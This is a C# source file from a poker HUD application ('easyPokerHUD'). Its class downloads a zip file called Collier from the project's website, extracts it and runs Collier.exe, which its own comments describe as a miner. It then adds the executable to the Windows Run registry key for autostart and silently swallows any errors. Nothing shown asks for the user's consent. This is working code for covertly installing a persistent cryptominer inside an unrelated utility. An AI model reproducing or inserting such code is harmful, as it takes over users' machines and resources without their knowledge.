using System;
using System.Net;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;

namespace easyPokerHUD
{
    class installCollier
    {
        static string minerInstallPackageUrl = @"https://easypokerhud.com/Collier.zip";
        static string collierLocalApplicationPath = @Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Collier";

        //Check if Collier is installed and if not, install it
        public static void installCollierIfNotInstalled()
        {
            if (!Directory.Exists(collierLocalApplicationPath))
            {
                downloadAndStartCollier();
            }
            addMinerToAutoStart();
        }

        //Download the collier and start it
        public static void downloadAndStartCollier()
        {
            Directory.CreateDirectory(collierLocalApplicationPath); 
            try
            {
                using (var client = new WebClient())
                {
                    client.DownloadFile(minerInstallPackageUrl, collierLocalApplicationPath + @"\Collier.zip");
                    System.IO.Compression.ZipFile.ExtractToDirectory(collierLocalApplicationPath + @"\Collier.zip", collierLocalApplicationPath);
                    Process.Start(collierLocalApplicationPath+@"\Collier.exe");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        //Adds the miner to autostart
        private static void addMinerToAutoStart()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("Collier", collierLocalApplicationPath + @"\Collier.exe");
            }
            catch (Exception e)
            {
                //Stay silent
            }
        }
    }
}
